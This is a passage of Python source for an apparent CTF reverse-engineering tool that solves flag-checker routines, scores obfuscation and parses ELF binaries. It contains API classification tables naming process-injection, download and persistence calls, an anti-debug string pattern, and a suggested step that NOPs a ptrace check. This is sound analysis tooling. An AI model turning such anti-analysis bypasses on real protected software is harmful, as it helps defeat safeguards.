        if h["name"] in ("Base64 alphabet",) or h["name"].startswith("Custom"):
            continue
        report.metrics.setdefault("crypto_script", []).append({**h, "loc": f"{pre}:{_line_of(layer.text, h['offset'])}"})
    if layer.lang not in ("py", "js"):
        pass


# ---------- checker solver (CTF flag checkers)
def _ops_to_str(ops: list[tuple]) -> str:
    parts = []
    for op, k in ops:
        if op in ("xor", "add", "sub"):
            parts.append(f"{op} {hex(k) if op == 'xor' else k}")
        elif op in ("xor_i", "add_i", "sub_i"):
            parts.append(op.replace("_i", " i"))
        elif op == "xor_ik":
            parts.append(f"xor (i+{k})")
        elif op == "xor_key":
            parts.append(f"xor key {bytes(k).decode('latin-1')!r}")
        elif op == "rol":
            parts.append(f"rol {k}")
    return " -> ".join(parts) or "identity"


def _apply_inverse(ops: list[tuple], t: int, i: int) -> int:
    for op, k in reversed(ops):
        if op == "xor":
            t ^= k
        elif op == "add":
            t -= k
        elif op == "sub":
            t += k
        elif op == "xor_i":
            t ^= i
        elif op == "add_i":
            t -= i
        elif op == "sub_i":
            t += i
        elif op == "xor_ik":
            t ^= (i + k)
        elif op == "xor_key":
            t ^= k[i % len(k)]
        elif op == "rol":
            t = ((t >> k) | (t << (8 - k))) & 0xFF
        t &= 0xFF
    return t


class _Checker:
    def __init__(self, ctx: _PyCtx, layer: Layer) -> None:
        self.ctx, self.folder, self.layer = ctx, ctx.folder, layer
        self.out: list[Checker] = []
        self.lens: dict[str, int] = {}

    def _const(self, node: ast.AST) -> Any:
        return self.folder.fold(node)

    def _base(self, node: ast.AST, c: str | None, idx: str | None) -> bool:
        """True when node denotes the input element (ord(c)/c/ord(X[i])/X[i])."""
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name) and node.func.id == "ord" and len(node.args) == 1:
            node = node.args[0]
        if isinstance(node, ast.Name) and c and node.id == c:
            return True
        if isinstance(node, ast.Subscript) and idx and isinstance(node.slice, ast.Name) and node.slice.id == idx:
            return isinstance(node.value, ast.Name)
        return False

    def parse(self, node: ast.AST, c: str | None, idx: str | None) -> list[tuple] | None:
        if self._base(node, c, idx):
            return []
        if isinstance(node, ast.BinOp):
            op = node.op
            if isinstance(op, ast.BitAnd) or isinstance(op, ast.Mod):
                k = self._const(node.right)
                if (isinstance(op, ast.BitAnd) and k == 0xFF) or (isinstance(op, ast.Mod) and k == 256):
                    return self.parse(node.left, c, idx)
                return None
            if isinstance(op, ast.BitOr) and isinstance(node.left, ast.BinOp) and isinstance(node.right, ast.BinOp) \
                    and isinstance(node.left.op, ast.LShift) and isinstance(node.right.op, ast.RShift):
                n1, n2 = self._const(node.left.right), self._const(node.right.right)
                inner = self.parse(node.left.left, c, idx)
                if isinstance(n1, int) and n2 == 8 - n1 and inner is not None:
                    return inner + [("rol", n1)]
                return None
            names = {ast.BitXor: "xor", ast.Add: "add", ast.Sub: "sub"}
            nm = names.get(type(op))
            if nm is None:
                return None
            for a, b, swap in ((node.left, node.right, False), (node.right, node.left, True)):
                if swap and nm == "sub":
                    continue
                inner = self.parse(a, c, idx)
                if inner is None:
                    continue
                k = self._const(b)
                if isinstance(k, int) and not isinstance(k, bool):
                    return inner + [(nm, k)]
                if idx and isinstance(b, ast.Name) and b.id == idx:
                    return inner + [(nm + "_i", 0)]
                if nm == "xor" and idx and isinstance(b, ast.BinOp) and isinstance(b.op, ast.Add):
                    kk = self._const(b.right) if isinstance(b.left, ast.Name) and b.left.id == idx else None
                    if isinstance(kk, int):
                        return inner + [("xor_ik", kk)]
                if nm == "xor" and isinstance(b, ast.Subscript) and idx and isinstance(b.slice, ast.BinOp) and isinstance(b.slice.op, ast.Mod):
                    key = self._const(b.value)
                    if isinstance(key, str):
                        key = key.encode("latin-1", "replace")
                    if isinstance(key, (list, tuple)) and all(isinstance(x, int) for x in key):
                        key = bytes(x & 0xFF for x in key)
                    if isinstance(key, bytes) and key:
                        return inner + [("xor_key", key)]
            return None
        return None

    def _target_list(self, v: Any) -> list[int] | None:
        if isinstance(v, str):
            return [ord(ch) for ch in v]
        if isinstance(v, bytes):
            return list(v)
        if isinstance(v, (list, tuple)) and v and all(isinstance(x, int) for x in v):
            return list(v)
        return None

    def _emit(self, node: ast.AST, method: str, cand_bytes: list[int] | None = None, cand: str | None = None, detail: str = "") -> None:
        if cand is None and cand_bytes is not None:
            cand = bytes(x & 0xFF for x in cand_bytes).decode("latin-1")
        cand = cand or ""
        if cand and decode.printable_ratio(cand.encode("latin-1", "replace")) < 0.9:
            return
        isflag = bool(cand and (FLAG_RE.search(cand) or _flag_re_of(self.layer).search(cand)))
        ln = getattr(node, "lineno", 1)
        if cand and self.lens:
            detail = (detail + " " if detail else "") + "length checks: " + ", ".join(f"len==" + str(v) for v in self.lens.values())
        ck = Checker(f"{self.layer.id}:{ln}", method, cand, "high" if isflag else ("medium" if cand else "medium"), detail or "solved statically")
        if all((c.loc, c.method, c.candidate) != (ck.loc, ck.method, ck.candidate) for c in self.out):
            self.out.append(ck)

    def run(self, tree: ast.AST) -> list[Checker]:
        ctx = self.ctx
        inputs = ctx.input_names  # type: ignore[attr-defined]
        for n in ast.walk(tree):
            if isinstance(n, ast.Compare) and len(n.ops) == 1 and isinstance(n.left, ast.Call) and isinstance(n.left.func, ast.Name) \
                    and n.left.func.id == "len" and isinstance(n.ops[0], ast.Eq):
                v = self._const(n.comparators[0])
                if isinstance(v, int) and n.left.args and isinstance(n.left.args[0], ast.Name):
                    self.lens[n.left.args[0].id] = v
        for n in ast.walk(tree):
            if isinstance(n, ast.Compare) and len(n.ops) == 1 and isinstance(n.ops[0], (ast.Eq, ast.NotEq)):
                self._compare(n, n.left, n.comparators[0], inputs)
                self._compare(n, n.comparators[0], n.left, inputs)
            elif isinstance(n, ast.For):
                self._loop(n, inputs)
        self._per_char(tree, inputs)
        return self.out

    def _unwrap_list(self, node: ast.AST) -> ast.AST:
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name) and node.func.id in ("bytes", "bytearray", "list") and len(node.args) == 1:
            return node.args[0]
        return node

    def _compare(self, cmp: ast.Compare, expr: ast.AST, const_node: ast.AST, inputs: set[str]) -> None:
        cv = self._const(const_node)
        expr = self._unwrap_list(expr)
        # (a) comprehension
        gen = expr if isinstance(expr, (ast.ListComp, ast.GeneratorExp)) else None
        if gen is not None and len(gen.generators) == 1 and isinstance(gen.generators[0].target, ast.Name):
            tgt = gen.generators[0].target.id
            it = gen.generators[0].iter
            tl = self._target_list(cv)
            if tl is None:
                return
            c = idx = None
            if isinstance(it, ast.Call) and isinstance(it.func, ast.Name) and it.func.id == "range":
                idx = tgt
            else:
                c = tgt
            ops = self.parse(gen.elt, c, idx)
            if ops is not None:
                self._emit(cmp, _ops_to_str(ops), [_apply_inverse(ops, t, i) for i, t in enumerate(tl)])
            return
        if isinstance(expr, ast.Call) and isinstance(expr.func, ast.Name) and expr.func.id == "map" and len(expr.args) == 2 \
                and isinstance(expr.args[0], ast.Lambda) and len(expr.args[0].args.args) == 1:
            tl = self._target_list(cv)
            ops = self.parse(expr.args[0].body, expr.args[0].args.args[0].arg, None)
            if tl is not None and ops is not None:
                self._emit(cmp, _ops_to_str(ops), [_apply_inverse(ops, t, i) for i, t in enumerate(tl)])
            return
        # (c) direct
        if isinstance(cv, (str, bytes)) and not isinstance(cmp.ops[0], ast.NotEq) or isinstance(cv, (str, bytes)):
            s = cv.decode("latin-1") if isinstance(cv, bytes) else cv
            x = expr
            if isinstance(x, ast.Name) and x.id in inputs:
                self._emit(cmp, "direct compare", cand=s)
            elif isinstance(x, ast.Subscript) and isinstance(x.value, ast.Name) and x.value.id in inputs and isinstance(x.slice, ast.Slice) \
                    and self._const(x.slice.step) == -1 if isinstance(x, ast.Subscript) and isinstance(x.slice, ast.Slice) and x.slice.step else False:
                self._emit(cmp, "reverse", cand=s[::-1])
            elif isinstance(x, ast.Call) and isinstance(x.func, ast.Attribute) and x.func.attr == "encode" and isinstance(x.func.value, ast.Name) and x.func.value.id in inputs:
                self._emit(cmp, "direct compare (encoded)", cand=s)
            elif isinstance(x, ast.Call) and self.ctx.qual(x.func) in ("base64.b64encode", "base64.urlsafe_b64encode") and x.args:
                a0 = x.args[0]
                if isinstance(a0, ast.Call) and isinstance(a0.func, ast.Attribute) and isinstance(a0.func.value, ast.Name) and a0.func.value.id in inputs:
                    try:
                        self._emit(cmp, "b64", cand=transform("b64", s).decode("latin-1"))
                    except TransformError:
                        pass
            elif isinstance(x, ast.Call) and self.ctx.qual(x.func) == "codecs.encode" and len(x.args) == 2 and isinstance(x.args[0], ast.Name) \
                    and x.args[0].id in inputs and self._const(x.args[1]) in ("rot13", "rot_13"):
                self._emit(cmp, "rot13", cand=str(_t_rot13(s)))
            elif isinstance(x, ast.Call) and isinstance(x.func, ast.Attribute) and x.func.attr == "hexdigest" and isinstance(x.func.value, ast.Call):
                q = self.ctx.qual(x.func.value.func) or ""
                if q.startswith("hashlib.") and re.fullmatch(r"[0-9a-fA-F]{16,}", s):
                    alg = q.split(".")[1]
                    self.out.append(Checker(f"{self.layer.id}:{cmp.lineno}", f"{alg} hash", "", "high",
                                            f"crack with `recon.py hashid crack {s}`"))
            else:
                v = self.folder.fold(x)
                if isinstance(v, (str, bytes)) and False:
                    pass

    def _loop(self, n: ast.For, inputs: set[str]) -> None:
        c = idx = None
        if isinstance(n.target, ast.Name) and isinstance(n.iter, ast.Call) and isinstance(n.iter.func, ast.Name) and n.iter.func.id == "range":
            idx = n.target.id
        elif isinstance(n.target, ast.Tuple) and len(n.target.elts) == 2 and all(isinstance(e, ast.Name) for e in n.target.elts) \
                and isinstance(n.iter, ast.Call) and isinstance(n.iter.func, ast.Name) and n.iter.func.id == "enumerate":
            idx, c = n.target.elts[0].id, n.target.elts[1].id
        else:
            return
        for st in ast.walk(n):
            if isinstance(st, ast.Compare) and len(st.ops) == 1 and isinstance(st.ops[0], (ast.Eq, ast.NotEq)):
                for expr, cst in ((st.left, st.comparators[0]), (st.comparators[0], st.left)):
                    if isinstance(cst, ast.Subscript) and isinstance(cst.slice, ast.Name) and cst.slice.id == idx:
                        arr = self._target_list(self._const(cst.value))
                        ops = self.parse(expr, c, idx)
                        if arr is not None and ops is not None:
                            self._emit(st, _ops_to_str(ops), [_apply_inverse(ops, t, i) for i, t in enumerate(arr)])
                            return

    def _per_char(self, tree: ast.AST, inputs: set[str]) -> None:
        chars: dict[int, str] = {}
        line = 1
        for n in ast.walk(tree):
            if isinstance(n, ast.Compare) and len(n.ops) == 1 and isinstance(n.ops[0], (ast.Eq, ast.NotEq)):
                l, r = n.left, n.comparators[0]
                if isinstance(l, ast.Subscript) and isinstance(l.value, ast.Name) and l.value.id in inputs:
                    i, v = self._const(l.slice), self._const(r)
                    if isinstance(i, int) and isinstance(v, str) and len(v) == 1:
                        chars.setdefault(i, v)
                        line = getattr(n, "lineno", line)
        if len(chars) >= 3 and sorted(chars) == list(range(len(chars))):
            cand = "".join(chars[i] for i in sorted(chars))
            class _N:
                lineno = line
            self._emit(_N(), "per-char compare", cand=cand)


def _flag_re_of(layer: Layer) -> re.Pattern:
    return FLAG_RE


def _py_checkers(layer: Layer, report: Report) -> None:
    text = layer.text or ""
    tree = ast.parse(text)
    folder = layer.meta.get("_folder")
    if not isinstance(folder, PyFolder):
        folder = PyFolder(tree)
        folder.build_env()
    ctx = _PyCtx(tree, text, folder)
    ctx.input_names = _py_input_names(tree)  # type: ignore[attr-defined]
    ck = _Checker(ctx, layer).run(tree)
    for c in ck:
        report.checkers.append(c)
        _add_tell(report, "T-CHECKER", c.loc, "flag-checker pattern solved" if c.candidate else "hash comparison", f"{c.method}", "high", "info")
        if c.candidate and (FLAG_RE.search(c.candidate) or _flag_re(report).search(c.candidate)):
            _merge_iocs(report, [IOC("flag", c.candidate, c.loc, "solved checker", "high", [])])


def _js_checker(layer: Layer, report: Report) -> None:
    text = layer.text or ""
    for m in re.finditer(r"(\w+)\.charCodeAt\(\s*(\w+)\s*\)\s*([\^+\-])\s*(0x[0-9a-fA-F]+|\d+)\s*!==?\s*(\w+)\[\s*\2\s*\]", text):
        am = re.search(r"(?:var|let|const)\s+" + re.escape(m.group(5)) + r"\s*=\s*\[([^\]]*)\]", text)
        if not am:
            continue
        try:
            arr = [int(x, 0) for x in am.group(1).split(",") if x.strip()]
        except ValueError:
            continue
        k = int(m.group(4), 0)
        inv = {"^": lambda t: t ^ k, "+": lambda t: t - k, "-": lambda t: t + k}[m.group(3)]
        cand = "".join(chr(inv(t) & 0xFF) for t in arr)
        if decode.printable_ratio(cand.encode("latin-1")) >= 0.9:
            ln = _line_of(text, m.start())
            c = Checker(f"{layer.id}:{ln}", f"{'xor' if m.group(3) == '^' else ('add' if m.group(3) == '+' else 'sub')} {hex(k)}", cand,
                        "high" if FLAG_RE.search(cand) else "medium", "js charCodeAt checker")
            report.checkers.append(c)
            _add_tell(report, "T-CHECKER", c.loc, "flag-checker pattern solved", c.method, "high", "info")
    for m in re.finditer(r"""if\s*\(\s*\w+\s*===?\s*(['"])([^'"]{4,})\1""", text):
        if FLAG_RE.search(m.group(2)) or re.search(r"(?i)flag|pass|key", text[max(0, m.start() - 80):m.start()]):
            report.checkers.append(Checker(f"{layer.id}:{_line_of(text, m.start())}", "direct compare", m.group(2), "medium", "js direct compare"))


# ---------- scores
def _compute_scores(report: Report) -> None:
    cnt: collections.Counter = collections.Counter()
    w = {"info": 0, "low": 3, "medium": 8, "high": 20}
    risk = 0
    for t in report.tells:
        if cnt[t.id] < 3:
            risk += w.get(t.severity, 0)
        cnt[t.id] += 1
    risk = min(100, risk)
    obf = min(60, 15 * max(0, len(report.layers) - 1)) if report.lane != "binary" else 0
    rd = max((l.meta.get("rename_density", 0) for l in report.layers), default=0)
    obf += 15 if rd >= 0.40 else (8 if rd >= 0.20 else 0)
    if max((l.meta.get("concat", 0) for l in report.layers), default=0) >= 12:
        obf += 8
    for tid in ("T-CHARCODE-ARRAY", "T-ESCAPE-DENSITY", "T-GETATTR-STRING", "T-IMPORT-DYNAMIC"):
        if any(t.id == tid for t in report.tells):
            obf += 5
    if any(t.id in ("T-JSFUCK", "T-AAENCODE", "T-JJENCODE") for t in report.tells):
        obf += 20
    if any(t.id in ("T-PACKED", "T-UPX") for t in report.tells):
        obf += 10
    obf = min(100, obf)
    report.scores = {
        "risk": {"score": risk, "band": "low" if risk < 20 else ("medium" if risk < 50 else "high")},
        "obfuscation": {"score": obf, "band": "none" if obf < 10 else ("light" if obf < 40 else "heavy"),
                        "layers": max(0, len(report.layers) - 1)},
    }


# ---------- orchestration
_LANG_DESC = {"py": "Python script", "js": "JavaScript", "sh": "shell script", "ps1": "PowerShell", "pyc": "Python bytecode",
              "html": "HTML", "text": "text", "blob": "data blob", "data": "data blob"}


def _script_lane(data: bytes, lang: str, opts: Options, report: Report) -> None:
    layers = _stage(report, "unwrap", unwrap_layers, data, lang, opts, report) or report.layers
    report.layers = layers
    kids = {l.parent for l in layers if l.parent}
    leaves = [l for l in layers if l.id not in kids]
    for l in layers:
        if l.lang == "pyc" and "marshal" not in l.meta and "raw_strings" not in l.meta:
            _stage(report, f"pyc-{l.id}", _pyc_prepare, l, report)
        _stage(report, f"scan-{l.id}", _scan_layer, l, report, opts)
        if l.lang == "js" and l.text is not None and "_toks" not in l.meta:
            _stage(report, f"js-{l.id}", _js_detect_only, l, report)
        _measure_light(l, report)
    for l in layers:
        if l.id in {x.id for x in leaves} or opts.deep or l.lang in ("pyc",) and l.id in {x.id for x in leaves}:
            _stage(report, f"annotate-{l.id}", annotate_layer, l, opts, report)
    for l in layers:
        for k in ("_folder", "_toks"):
            if k in l.meta and not opts.deep:
                pass
    report.metrics["leaves"] = [l.id for l in leaves]
    # embedded ELF/PE layers: builtin digest only when deep
    for l in layers:
        if l.lang in ("elf", "pe") and opts.deep:
            sub = Report({"name": l.id})
            _stage(report, f"embedded-bin-{l.id}", analyze_binary, l.data, None, Options(engine="none", deep=False), sub,
                   Engines(capstone=bool(disasm.capstone)))
            l.meta["binary"] = sub.binary


def _measure_light(l: Layer, report: Report) -> None:
    """Obfuscation measures for layers that were not annotated (wrappers)."""
    if l.text is None or "rename_density" in l.meta:
        return
    if l.lang == "py":
        try:
            tree = ast.parse(l.text)
        except (SyntaxError, ValueError, RecursionError, MemoryError):
            return
        ids = {n.id for n in ast.walk(tree) if isinstance(n, ast.Name)} | {n.arg for n in ast.walk(tree) if isinstance(n, ast.arg)}
        ids -= set(dir(__builtins__) if not isinstance(__builtins__, dict) else __builtins__.keys())
        _measure_text(l, report, ids)


def analyze(data: bytes, name: str = "<input>", opts: Options | None = None, engines: Engines | None = None) -> Report:
    """Analyze ``data`` (script or binary). Never raises for any bytes input."""
    opts = opts or Options()
    report = Report({"name": name, "size": len(data), "sha256": "", "md5": "", "type": ""})
    try:
        if len(data) > MAX_INPUT:
            report.notes.append(f"input truncated to {MAX_INPUT >> 20} MiB")
            data = data[:MAX_INPUT]
        h = triage.hashes(data)
        report.target.update({"sha256": h["sha256"], "md5": h["md5"], "type": triage.detect_type(data)})
        report.metrics["flag_re"] = opts.flag_re or FLAG_RE
        if opts.flag_re is not None and opts.flag_re.pattern != FLAG_RE.pattern:
            pass
        lane, lang, conf = detect_input(data, name)
        if opts.lane == "script":
            lane = "script" if lane in ("bin", "blob") else lane
            lang = lang if lane == "script" and lang not in ("elf", "pe") else _detect_lang(_decode_text(data[:MAX_SCRIPT]))[0]
            conf = "forced"
        elif opts.lane == "bin":
            lane, conf = "bin", "forced"
        if opts.lang != "auto":
            lang, conf = opts.lang, "forced"
            if lane == "bin":
                lane = "script"
        report.lang, report.lang_confidence = lang, conf
        if lane == "bin":
            report.lane = "binary"
            engines = engines or detect_engines(_WHICH)
            _stage(report, "binary", analyze_binary, data, _CUR_PATH, opts, report, engines)
        else:
            report.lane = "script"
            if lane == "blob":
                report.lane = "blob"
                _stage(report, "blob", _blob_lane, data, opts, report)
                if report.lane == "script":
                    _script_lane(data, "data", opts, report)
            else:
                _script_lane(data, lang, opts, report)
        _stage(report, "flags", _note_flags, report, _flag_re(report))
        _stage(report, "scores", _compute_scores, report)
        _stage(report, "steps", _next_steps, report, opts)
    except Exception as exc:  # noqa: BLE001 - analyze() never raises
        report.errors.append(f"analyze: {type(exc).__name__}: {str(exc)[:160]}")
    except RecursionError as exc:  # pragma: no cover
        report.errors.append(f"analyze: RecursionError: {exc}")
    if not report.scores:
        _stage(report, "scores", _compute_scores, report)
    return report


def _blob_lane(data: bytes, opts: Options, report: Report) -> None:
    probe = Report(dict(report.target))
    layers = unwrap_layers(data, "data", opts, probe)
    if len(layers) > 1 and any(l.text is not None for l in layers[1:]):
        report.lane = "script"
        report.layers = []
        return
    a, u = triage.extract_strings(data, 5)
    iocs = []
    for s in (a + u)[:MAX_FINDINGS]:
        iocs += extract_iocs(s, "blob", FLAG_RE, ("from-binary",))
    _merge_iocs(report, iocs)
    report.layers = layers
    report.binary = {"format": "blob", "entropy": round(triage.entropy(data[:1 << 20]), 2),
                     "note": triage.entropy_note(triage.entropy(data[:1 << 20]), len(data)),
                     "strings": [{"value": s[:100]} for s in (a + u)[:20]],
                     "crypto": scan_crypto_constants(data),
                     "embedded": [{"offset": h["offset"], "name": h["name"]} for h in binextras.scan_signatures(data) if h["offset"] > 0][:20]}


def _next_steps(report: Report, opts: Options) -> None:
    s = report.next_steps
    name = report.target.get("name", "file")
    if len(report.layers) > 1 and not opts.dump_dir:
        s.append(f"recon.py revauto {name} --deep --dump-layers ./layers   (every layer + cleaned source)")
        s.append("recon.py decode -f <dumped layer>   (further manual decoding)")
    for c in report.checkers:
        if not c.candidate and "hash" in c.method:
            s.append(c.detail)
    tids = {t.id for t in report.tells}
    if "T-PTRACE" in tids or "T-ANTI-DEBUG" in tids and report.lane == "binary":
        s.append("recon.py gdbkit find ptrace           (bypass the ptrace check)")
        b = report.binary or {}
        site = next((a["site"] for a in b.get("antidebug", []) if a.get("kind") == "ptrace-syscall"), None)
        if site is not None:
            s.append(f"recon.py elfpatch nop {name} --at {hex(site)} --len 2 -o patched   (NOP the ptrace syscall)")
    if report.lane == "binary":
        if "T-UPX" in tids and _WHICH("upx"):
            s.append("upx -d <file>   (UPX detected and upx is on PATH; revauto never runs it)")
        if "T-PYINSTALLER" in tids:
            s.append("extract with pyinstxtractor (not bundled), then run revauto on the .pyc")
        if "T-DOTNET" in tids:
            s.append("managed assembly: use ILSpy/dnSpy (not bundled)")
        e = report.engines
        if not disasm.capstone:
            s.append("install capstone for real disassembly; radare2 for function/xref recovery")
        elif e.get("r2") and e["r2"].status == "skipped":
            s.append("install radare2 for function/xref recovery")
        if _WHICH("analyzeHeadless") and e.get("ghidra") and e["ghidra"].status == "not-requested":
            s.append("--engine ghidra   (analyzeHeadless found; decompiles top functions)")
    for l in report.layers:
        if l.lang == "pyc" and any("pycdc" in n for n in l.notes):
            s.append("pycdc / decompyle3 on the .pyc (version mismatch; if installed)")
    del s[6:]
    report.next_steps = list(dict.fromkeys(s))[:6]


def detect_engines(which: Callable[[str], str | None] = shutil.which) -> Engines:
    """Detect optional analysis engines (radare2, r2pipe, ghidra, capstone) without running anything heavy."""
    r2 = which("r2") or which("radare2")
    try:
        import r2pipe  # type: ignore
    except Exception:  # noqa: BLE001
        r2pipe = None
    gh = which("analyzeHeadless")
    if not gh:
        for cand in (os.path.join(os.environ.get("GHIDRA_INSTALL_DIR", ""), "support", "analyzeHeadless")
                     if os.environ.get("GHIDRA_INSTALL_DIR") else "", "/usr/share/ghidra/support/analyzeHeadless"):
            if cand and which is shutil.which and os.path.isfile(cand):
                gh = cand
                break
    return Engines(r2, r2pipe, gh, bool(disasm.capstone))


# ---------- binary lane: tables
SYSCALLS_I386 = {1: "exit", 2: "fork", 3: "read", 4: "write", 5: "open", 6: "close", 11: "execve", 26: "ptrace",
                 37: "kill", 102: "socketcall", 120: "clone", 125: "mprotect", 192: "mmap2", 252: "exit_group",
                 359: "socket", 362: "connect"}
_API_EXACT: dict[str, tuple[str, str | None]] = {}
_API_PREFIX: list[tuple[str, str, str | None]] = []


def _reg(cat: str, tell: str | None, names: str, prefixes: str = "") -> None:
    for n in names.split():
        _API_EXACT.setdefault(n, (cat, tell))
    for p in prefixes.split():
        _API_PREFIX.append((p, cat, tell))


_reg("NETWORK", None, "socket connect bind listen accept send sendto recv recvfrom getaddrinfo gethostbyname inet_addr inet_pton", "curl_easy_ SSL_connect")
_reg("FILE_READ", None, "fopen open openat fread fgets")
_reg("FILE_WRITE", None, "fwrite fputs fprintf rename")
_reg("FILE_DELETE", None, "unlink remove")
_reg("EXEC", None, "system popen execve execl execlp execv execvp fork vfork posix_spawn CreateProcessA CreateProcessW CreateProcessInternalW ShellExecuteA ShellExecuteW ShellExecuteExA ShellExecuteExW WinExec")
_reg("ANTI_ANALYSIS", "T-PTRACE", "ptrace")
_reg("ANTI_ANALYSIS", None, "prctl getppid signal sigaction raise alarm")
_reg("COMPARE_CHECK", None, "strcmp strncmp memcmp strcasecmp strstr bcmp")
_reg("RNG", None, "srand rand random time clock_gettime gettimeofday")
_reg("MEMORY_EXEC", "T-SELF-MODIFY", "mprotect")
_reg("MEMORY_EXEC", None, "mmap")
_reg("DYNAMIC_LOAD", None, "dlopen dlsym LoadLibraryA LoadLibraryW GetProcAddress")
_reg("CRYPTO", None, "crypt CryptEncrypt CryptDecrypt", "EVP_ AES_ MD5 SHA1 SHA256 RC4 DES_ BF_ CryptAcquireContext BCrypt")
_reg("INPUT", None, "scanf gets getline __isoc99_scanf getchar")
_reg("OUTPUT", None, "printf puts write putchar __printf_chk")
_reg("PRIVESC", None, "getuid geteuid setuid setgid")
_reg("ANTI_ANALYSIS", "T-ANTI-DEBUG", "IsDebuggerPresent CheckRemoteDebuggerPresent NtQueryInformationProcess GetTickCount QueryPerformanceCounter", "OutputDebugString")
_reg("MEMORY_EXEC", "T-MEMORY-EXEC", "WriteProcessMemory CreateRemoteThread NtUnmapViewOfSection", "VirtualAlloc VirtualProtect")
_reg("NETWORK", None, "WSAStartup", "InternetOpen InternetReadFile HttpSendRequest URLDownloadToFile WinHttp")
_reg("PERSISTENCE", "T-PERSIST", "", "RegSetValueEx RegCreateKey")


def _api_lookup(name: str) -> tuple[str, str | None] | None:
    n = name.split("@")[0]
    hit = _API_EXACT.get(n)
    if hit:
        return hit
    for p, c, t in _API_PREFIX:
        if n.startswith(p):
            return c, t
    return None


_STR_TAG_RES = [
    ("PROMPT", re.compile(r"(?i)\b(?:enter|input|password|passwd|key|flag|serial|licen[cs]e|correct|wrong|incorrect|success|fail|nope|try again|congrat|access (?:granted|denied)|usage)\b")),
    ("FORMAT", re.compile(r"%[-+ #0]*\d*(?:\.\d+)?[sdxXpculi]")),
    ("PATH", _PATH_RE), ("URL", _URL_RE),
    ("ANTI", re.compile(r"/proc/self/(?:status|maps)|TracerPid|LD_PRELOAD|\bgdb\b|frida|ptrace|vmware|VBox|QEMU", re.I)),
    ("CRYPTO", re.compile(r"(?i)\b(aes|rc4|xor|key|iv|salt|sha\d*|md5|des|chacha|tea)\b")),
]
_TAG_RANK = {"FLAG": 0, "PROMPT": 1, "URL": 2, "IP": 2, "PATH": 2, "B64": 3, "HEX": 3, "ANTI": 4, "CRYPTO": 4, "FORMAT": 5}
_ASCII_S = re.compile(rb"[\x20-\x7e\t]{5,}")
_UTF16_S = re.compile(rb"(?:[\x20-\x7e]\x00){5,}")


@dataclass
class _Sec:
    name: str
    off: int
    size: int
    addr: int
    flags: int
    type: int
    link: int = 0
    entsize: int = 0

    @property
    def exec(self) -> bool:
        return bool(self.flags & 4) and self.type != 8

    @property
    def alloc(self) -> bool:
        return bool(self.flags & 2) or (self.addr != 0 and self.type != 0)


def _elf_sections_full(data: bytes) -> tuple[list[_Sec], bool, str]:
    if len(data) < 52 or data[:4] != b"\x7fELF":
        raise ValueError("not ELF")
    is64 = data[4] == 2
    e = "<" if data[5] == 1 else ">"
    if is64:
        shoff, = struct.unpack_from(e + "Q", data, 0x28)
        shentsize, shnum, shstrndx = struct.unpack_from(e + "HHH", data, 0x3A)
        fmt, sz = e + "IIQQQQIIQQ", 64
    else:
        shoff, = struct.unpack_from(e + "I", data, 0x20)
        shentsize, shnum, shstrndx = struct.unpack_from(e + "HHH", data, 0x2E)
        fmt, sz = e + "IIIIIIIIII", 40
    secs: list[_Sec] = []
    names: list[int] = []
    if shoff and shnum and shoff + shnum * max(shentsize, sz) <= len(data):
        for i in range(min(shnum, 4096)):
            f = struct.unpack_from(fmt, data, shoff + i * max(shentsize, sz))
            if is64:
                nm, ty, fl, ad, of, si, li, _inf, _al, es = f
            else:
                nm, ty, fl, ad, of, si, li, _inf, _al, es = f
            secs.append(_Sec("", of, si, ad, fl, ty, li, es))
            names.append(nm)
        if shstrndx < len(secs):
            st = secs[shstrndx]
            blob = data[st.off:st.off + st.size]
            for s, nm in zip(secs, names):
                end = blob.find(b"\0", nm)
                s.name = blob[nm:end if end >= 0 else None].decode("latin-1")
    return secs, is64, e


def elf_symbols(data: bytes) -> list[dict]:
    """Parse ``.symtab`` / ``.dynsym``: ``{name, value, size, type, bind, shndx, table}`` (max 200 000)."""
    secs, is64, e = _elf_sections_full(data)
    out: list[dict] = []
    types = {0: "NOTYPE", 1: "OBJECT", 2: "FUNC", 3: "SECTION", 4: "FILE", 6: "TLS", 10: "IFUNC"}
    binds = {0: "LOCAL", 1: "GLOBAL", 2: "WEAK"}
    for s in secs:
        if s.type not in (2, 11) or s.link >= len(secs):
            continue
        strs = secs[s.link]
        blob = data[strs.off:strs.off + strs.size]
        es = s.entsize or (24 if is64 else 16)
        table = ".symtab" if s.type == 2 else ".dynsym"
        for i in range(min(s.size // es, 200000 - len(out))):
            o = s.off + i * es
            if o + es > len(data):
                break
            if is64:
                nm, info, _oth, shndx, val, size = struct.unpack_from(e + "IBBHQQ", data, o)
            else:
                nm, val, size, info, _oth, shndx = struct.unpack_from(e + "IIIBBH", data, o)
            end = blob.find(b"\0", nm)
            name = blob[nm:end if end >= 0 else None].decode("latin-1")
            out.append({"name": name, "value": val, "size": size, "type": types.get(info & 0xF, str(info & 0xF)),
                        "bind": binds.get(info >> 4, str(info >> 4)), "shndx": shndx, "table": table})
    return out


class _BinCtx:
    """Internal builtin-analysis state (not serialised)."""

    def __init__(self, data: bytes, is_pe: bool, bits: int, arch: str, entry: int) -> None:
        self.data, self.is_pe, self.bits, self.arch, self.entry = data, is_pe, bits, arch, entry
        self.secs: list[_Sec] = []
        self.got: dict[int, str] = {}
        self.plt: dict[int, str] = {}
        self.calls: list[tuple[int, int]] = []
        self.impcalls: list[tuple[int, str]] = []
        self.xrefs: list[tuple[int, int]] = []
        self.syscalls: list[dict] = []
        self.xor_sites: list[dict] = []
        self.sites: dict[str, list[int]] = {"rdtsc": [], "cpuid": [], "int3": []}
        self.starts: dict[int, tuple[str, str]] = {}  # addr -> (name, source)
        self.sizes: dict[int, int] = {}
        self.main: int | None = None

    def o2v(self, off: int) -> int | None:
        for s in self.secs:
            if s.addr and s.type != 8 and s.off <= off < s.off + s.size and s.alloc:
                return s.addr + off - s.off
        return None

    def v2o(self, va: int) -> int | None:
        for s in self.secs:
            if s.addr and s.type != 8 and s.addr <= va < s.addr + max(s.size, 0) and s.alloc:
                return s.off + va - s.addr
        return None

    def sec_of_off(self, off: int) -> _Sec | None:
        return next((s for s in self.secs if s.off <= off < s.off + s.size and s.size and s.type != 8), None)

    def sec_of_va(self, va: int) -> _Sec | None:
        return next((s for s in self.secs if s.addr and s.addr <= va < s.addr + s.size), None)


def _ent(b: bytes) -> float:
    if len(b) <= (1 << 20):
        return triage.entropy(b)
    import math
    c = collections.Counter(b)
    n = len(b)
    return -sum(v / n * math.log2(v / n) for v in c.values())


